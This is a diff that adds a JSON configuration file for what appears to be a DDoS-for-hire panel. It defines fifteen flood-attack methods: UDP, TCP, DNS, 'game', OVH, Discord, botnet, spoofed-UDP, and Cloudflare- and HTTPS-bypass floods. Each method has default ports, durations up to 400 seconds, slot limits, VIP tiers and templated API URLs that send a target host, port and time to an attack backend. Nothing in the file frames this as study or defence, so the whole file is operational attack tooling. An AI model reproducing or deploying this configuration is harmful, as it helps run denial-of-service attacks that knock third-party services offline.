@@ -1,0 +1,235 @@
+[
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "udp",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=udp"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "tcp",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=tcp"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "game",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=game"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "https-bypass",
+    "group": "LAYER 7",
+    "defaultPort": 443,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=https-bypass"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "tls",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=tls"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "dns",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=dns"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "ovh",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=ovh"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "discord",
+    "group": "LAYER 4",
+    "defaultPort": 443,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=discord"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "botnet-udp",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [
+      "vip"
+    ],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=botnet-udp"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "botnet-tcp",
+    "group": "LAYER 4",
+    "defaultPort": 22,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [
+      "vip"
+    ],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=botnet-tcp"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "botnet-pps",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [
+      "vip"
+    ],
+    "API": []
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "botnet-syn",
+    "group": "LAYER 4",
+    "defaultPort": 443,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [
+      "vip"
+    ],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=botnet-syn"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "spoof-udp",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [
+      "vip"
+    ],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=spoof-udp"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "cloudflare",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=cloudflare"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "http",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 400,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://YOUR_API_HOST:PORT/api/attack?username=USER&api_key=KEY&target={host}&port={port}&time={time}&method=http"
+    ]
+  }
+]
